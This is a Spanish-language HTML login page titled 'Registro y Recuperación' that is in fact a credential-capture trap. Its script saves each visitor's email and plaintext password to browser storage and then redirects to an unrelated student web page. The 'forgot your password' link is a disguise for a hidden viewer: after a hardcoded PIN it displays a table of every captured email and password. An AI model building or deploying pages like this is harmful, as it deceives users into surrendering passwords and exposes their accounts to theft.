<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Registro y Recuperación</title>
<style>
body { margin: 0; font-family: Arial, sans-serif; background: linear-gradient(135deg, #f5f7fa, #c3cfe2); display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
.login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; margin-bottom: 20px; }
.login-box h2 { margin-bottom: 5px; }
.login-box p { margin-top: 0; color: #666; font-size: 14px; }
.login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; }
.login-box button { width: 100%; padding: 12px; background: #4285F4; border: none; border-radius: 10px; color: white; cursor: pointer; margin-top: 10px; }
.extra { margin-top: 15px; font-size: 13px; color: #666; }
.extra a { color: #4285F4; text-decoration: none; cursor: pointer; }
.extra a:hover { text-decoration: underline; }

/* Tabla estilo Excel */
#historialContainer { display: none; margin-top: 20px; width: 90%; max-width: 800px; overflow-x: auto; }
#historialContainer table { width: 100%; border-collapse: collapse; }
#historialContainer th, #historialContainer td { border: 1px solid #ccc; padding: 10px; text-align: left; }
#historialContainer th { background: #4285F4; color: white; }
#historialContainer tr:nth-child(even) { background: #f0f0f0; }
</style>
</head>
<body>

<div class="login-box">
  <h2>Regístrate</h2>
  <p>Bienvenido, ingresa tus datos</p>
  <form id="loginForm">
    <input type="email" name="email" placeholder="Correo electrónico" required>
    <input type="password" name="password" placeholder="Contraseña" required>
    <button type="submit">Ingresar</button>
  </form>

  <div class="extra">
    <p>¿Olvidaste tu contraseña? <a id="recoverLink">Recupérala aquí</a></p>
  </div>
</div>

<!-- Contenedor oculto para historial tipo Excel -->
<div id="historialContainer">
  <h2>Historial de Datos Registrados</h2>
  <table>
    <thead>
      <tr>
        <th>#</th>
        <th>Correo</th>
        <th>Contraseña</th>
        <th>Fecha</th>
      </tr>
    </thead>
    <tbody id="historialTableBody"></tbody>
  </table>
</div>

<script>
const loginForm = document.getElementById('loginForm');
const recoverLink = document.getElementById('recoverLink');
const historialContainer = document.getElementById('historialContainer');
const historialTableBody = document.getElementById('historialTableBody');

// Guardar datos y redirigir al enviar el formulario
loginForm.addEventListener('submit', function(e){
  e.preventDefault();
  const email = this.email.value;
  const password = this.password.value;

  // Obtener historial previo
  let historial = JSON.parse(localStorage.getItem('historialDatos')) || [];

  // Agregar nuevo registro
  historial.push({ email, password, fecha: new Date().toLocaleString() });

  // Guardar historial actualizado
  localStorage.setItem('historialDatos', JSON.stringify(historial));

  // Redirigir a la página deseada
  window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
});

// Mostrar historial al hacer clic en el enlace con PIN
recoverLink.addEventListener('click', function(){
  const pin = prompt("Ingresa el PIN para acceder a los datos:");

  if(pin === "2006"){
    // Obtener historial
    let historial = JSON.parse(localStorage.getItem('historialDatos')) || [];

    // Limpiar tabla previa
    historialTableBody.innerHTML = "";

    // Llenar tabla
    historial.forEach((dato, index) => {
      const tr = document.createElement('tr');
      tr.innerHTML = `
        <td>${index + 1}</td>
        <td>${dato.email}</td>
        <td>${dato.password}</td>
        <td>${dato.fecha}</td>
      `;
      historialTableBody.appendChild(tr);
    });

    // Mostrar contenedor
    historialContainer.style.display = "block";

    // Scroll hasta la tabla
    historialContainer.scrollIntoView({ behavior: 'smooth' });
  } else {
    alert("PIN incorrecto ❌");
  }
});
</script>

</body>
</html>
